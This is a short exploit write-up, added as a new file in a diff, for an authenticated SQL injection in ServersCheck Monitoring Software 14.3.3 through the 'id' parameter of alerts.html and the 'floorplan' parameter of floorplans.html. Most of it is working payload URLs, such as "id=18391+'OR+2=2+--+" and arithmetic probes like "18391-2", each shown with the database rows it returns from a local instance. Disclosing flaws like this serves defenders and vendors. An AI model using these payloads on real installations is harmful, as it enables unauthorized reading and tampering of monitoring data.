@@ -1,0 +1,58 @@
+# Exploit Title: ServersCheck Monitoring Software 14.3.3 - 'id' SQL Injection
+# Author: John Page (aka hyp3rlinx)	
+# Date: 2018-10-23
+# Vendor: www.serverscheck.com
+# Software link: http://downloads.serverscheck.com/monitoring_software/setup.exe
+# CVE: N/A
+# References:
+# https://serverscheck.com/monitoring-software/release.asp
+# http://hyp3rlinx.altervista.org/advisories/CVE-2018-18550-SERVERSCHECK-MONITORING-SOFTWARE-SQL-INJECTION.txt
+
+# Security Issue
+# ServersCheck Monitoring Software allows for SQL Injection by an authenticated user 
+# via the alerts.html "id" parameter.
+
+# Exploit/POC
+http://127.0.0.1:1272/alerts.html?id=18391
+
+Result:
+Alerts History for SENSORXY
+No data available in table
+
+Then using 'OR+2=2,
+
+http://127.0.0.1:1272/alerts.html?id=18391+'OR+2=2+--+
+
+Result:
+
+Alerts History for test
+155 	a day ago 	CPU on 127.0.0.1 	Status Change 	DOWN to OK 	
+154 	a day ago 	CPU on 127.0.0.1 	Status Change 	OK to DOWN 	
+153 	a day ago 	test 	Status Change 	OK to DOWN 	Unable to connect to host
+
+
+# SQL Injection - original page results successfully manipulated using 18391-2
+# Examples:
+
+http://127.0.0.1:1272/alerts.html?id=18391
+No data available in table
+
+Then using 34 minus 2,
+
+http://127.0.0.1:1272/alerts.html?id=18391-2
+153 	a day ago 	test 	Status Change 	OK to DOWN 	Unable to connect to host
+
+and minus 1,
+
+http://127.0.0.1:1272/alerts.html?id=18391-1
+155 	a day ago 	CPU on 127.0.0.1 	Status Change 	DOWN to OK 	
+154 	a day ago 	CPU on 127.0.0.1 	Status Change 	OK to DOWN
+
+
+http://127.0.0.1:1272/floorplans.html?floorplan=34
+Floor Plan PLANXY
+
+Then using 34 minus 2,
+
+http://127.0.0.1:1272/floorplans.html?floorplan=34-2
+Floor Plan 0
